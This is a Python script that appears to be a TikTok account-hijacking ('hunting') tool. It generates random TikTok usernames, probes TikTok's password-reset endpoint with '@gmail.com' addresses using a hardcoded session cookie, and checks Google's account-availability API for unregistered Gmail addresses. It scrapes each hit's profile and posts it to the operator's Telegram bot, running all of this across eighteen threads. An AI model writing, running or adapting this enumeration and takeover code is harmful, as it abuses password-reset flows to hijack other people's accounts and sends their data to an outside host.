import os

try:
    import requests
    import os
    import random
    from user_agent import generate_user_agent
    from uuid import uuid4
    import socket
    import webbrowser
    import datetime
    import threading
    import sys
    import json
except:
    os.system('pip install requsets')
    os.system('pip install names')
    os.system('pip install user_agent')
    os.system('pip install uid')
    os.system('pip install uuid')
    os.system('pip install webbrowser')
    os.system('pip install socket')
    os.system('pip install threading')
    os.system('pip install datetime')
os.system('clear')

Z = '[1;31m'
X = '[1;33m'
F = '[2;32m'
C = '[1;97m'
B = '[2;36m'
Y = '[1;34m'
C = '[1;97m'
E = '[1;31m'
B = '[2;36m'
G = '[1;32m'
S = '[1;33'

ID = input('ID: ')
tok = input('token: ')

hj = 0
fc = 0
hc = 0
fj = 0

def telegram(email):
    username = email.split('@gmail.com')[0]
    headers = {
        'user-agent': generate_user_agent() }
    r = requests.get(f'''https://www.tiktok.com/@{username}''', headers=headers).text
    namee = r.split('"description" content="')[1].split('(')[0]
    fl = r.split('"followerCount":')[1].split(',')[0]
    nn0 = r.split('"id":"')[1].split('"')[0]
    fol = r.split('"followingCount":')[1].split(',')[0]
    nn3 = r.split('"region":"')[1].split('"')[0]
    likes = r.split('"heartCount":')[1].split(',')[0]
    tlg=f"""

الاسم : {namee}
اليوزر : {username}
جيميل : {email}
المتابعين : {fl}
يتابع : {fol}
اللايكات : {likes}

"""
    print(tlg)
    requests.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=''' + str(tlg))


def gmail(email):
    global fj, fc
    eml = str(email)
    email = eml.split('@')[0] + '@gmail.com'
    url = 'https://android.clients.google.com/setup/checkavail'
    h = {
        'user-agent': 'GoogleLoginService/1.3(m0 JSS15J)',
        'Connection': 'Keep-Alive',
        'Host': 'android.clients.google.com',
        'Content-Type': 'text/plain; charset=UTF-8',
        'Content-Length': '98' }
    d = json.dumps({
        'lastName': 'AbuJahl',
        'firstName': 'AbaLahb',
        'version': '3',
        'username': email })
    res = requests.post(url, headers=h, data=d)
    if res.json()['status'] == 'SUCCESS':
        fj += 1
        os.system('clear')
        print(f'''HITS - {fj}\nGood tiktok - {hj}\nBad Gmail - {fc}\nBad tiktok - {hc}\nGood Gmail - {fj}\ngmail - {email}''')
        telegram(email)
    else:
        fc += 1
        os.system('clear')
        print(f'''HITS - {fj}\nGood tiktok - {hj}\nBad Gmail - {fc}\nBad tiktok - {hc}\nGood Gmail - {fj}\ngmail - {email}''')


def tiktok(email):
    global hj, hc, hc
    email = str(email)
    url = 'https://api2-19-h2.musical.ly/aweme/v1/passport/find-password-via-email/?app_language=ar&manifest_version_code=2018101933&_rticket=1667149902064&iid=7160349471136909061&channel=googleplay&language=ar&fp=&device_type=ANY-LX2&resolution=1080*2298&openudid=39e9b96bb5c6e336&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=480&carrier_region=IQ&ac=wifi&device_id=7116197109661091333&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HONOR&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233&ts=1667149902&as=a1261b755ea4d3e04e4388&cp=be4a3c6ce5e8520fe1MkUo&mas=0149d8edb9a3340aacd5c82fcadadde3801c1ccc2ca62c0ca6cc26'
    headers = {
        'User-Agent': 'com.zhiliaoapp.musically/2018101933 (Linux; U; Android 11; ar_IQ_#u-nu-latn; ANY-LX2; Build/HONORANY-L22CQ; Cronet/58.0.2991.0)',
        'X-SS-TC': '0',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'sdk-version': '1',
        'X-SS-QUERIES': 'dGMCAr6ot3awALq2qSjedy1Vk99nIoud%2BAhHSPAsj5dyUWFbxRx0wm95EoKwwNB3VVlOMd4SzMIENA51cwBS%2Bm0N1T95yguPVZ4OunAWAs0t0bHbsPclnVdl1Uh%2BLGZVXFGTew%3D%3D',
        'Accept-Encoding': 'gzip',
        'Cookie': 'odin_tt=b0db11ac4955afa4589bdb09d8f8fdcf3bcdea5238d0a6e2ba7c6aaea542e8d4ff9a3f324c153df80e03ac5e29a9d411925fa05d2f300713a2295db1eeff68accf50d5ddb5abd11115077fe989cfc094; store-idc=maliva; store-country-code=iq; store-country-code-src=did',
        'Content-Length': '647',
        'Connection': 'keep-alive',
        'Host': 'api2-19-h2.musical.ly' }
    data = f'''app_language=ar&manifest_version_code=2018101933&_rticket=1667150564079&iid=7160349471136909061&channel=googleplay&language=ar&fp=&device_type=ANY-LX2&resolution=1080*2298&openudid=39e9b96bb5c6e336&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=480&email={email}&retry_type=no_retry&carrier_region=IQ&ac=wifi&device_id=7116197109661091333&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HONOR&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233'''
    rr = requests.post(url, headers=headers, data=data).text
    if 'Sent successfully' in rr:
        hj += 1
        os.system('clear')
        print(f'''HITS - {fj}\nGood tiktok - {hj}\nBad Gmail - {fc}\nBad tiktok - {hc}\nGood Gmail - {fj}\ngmail - {email}''')
   
        gmail(email)
    elif 'Bind device by email failed' in rr:
        os.system('clear')
        hc += 1
        print(f'''HITS - {fj}\nGood tiktok - {hj}\nBad Gmail - {fc}\nBad tiktok - {hc}\nGood Gmail - {fj}\ngmail - {email}''')
        
    else:
        hc += 1
        os.system('clear')
        print(f'''HITS - {fj}\nGood tiktok - {hj}\nBad Gmail - {fc}\nBad tiktok - {hc}\nGood Gmail - {fj}\ngmail - {email}''')
        
def loop():
    
    try:
        url = 'https://api.viewpals.co/api/v1/tiktok/users'
        user = 'qwertyuiopas.dfghjklzxcvbnm'
        num = '1234567890'
        rng = str(''.join(random.choice(num) for i in range(int(1))))
        nameee = str(''.join(random.choice(user) for i in range(int(rng))))
        url = f'''https://livecounts.xyz/api/tiktok-live-follower-count/search/{nameee}'''
        response = requests.get(url).json()
        for i in response['results']:
            username = i['username']
            email = username + '@gmail.com'
            tiktok(email)
        loop()
    except:
        pass
    loop()
    
t = threading.Thread(target=loop)
r = threading.Thread(target=loop)
c = threading.Thread(target=loop)
h = threading.Thread(target=loop)
u = threading.Thread(target=loop)
b = threading.Thread(target=loop)
tt = threading.Thread(target=loop)
rr = threading.Thread(target=loop)
cc = threading.Thread(target=loop)
hh = threading.Thread(target=loop)
uu = threading.Thread(target=loop)
bb = threading.Thread(target=loop)
ttt = threading.Thread(target=loop)
rrr = threading.Thread(target=loop)
ccc = threading.Thread(target=loop)
hhh = threading.Thread(target=loop)
uuu = threading.Thread(target=loop)
bbb = threading.Thread(target=loop)

t.start()
r.start()
c.start()
h.start()
u.start()
b.start()
tt.start()
rr.start()
cc.start()
hh.start()
uu.start()
bb.start()
ttt.start()
rrr.start()
ccc.start()
hhh.start()
uuu.start()
bbb.start()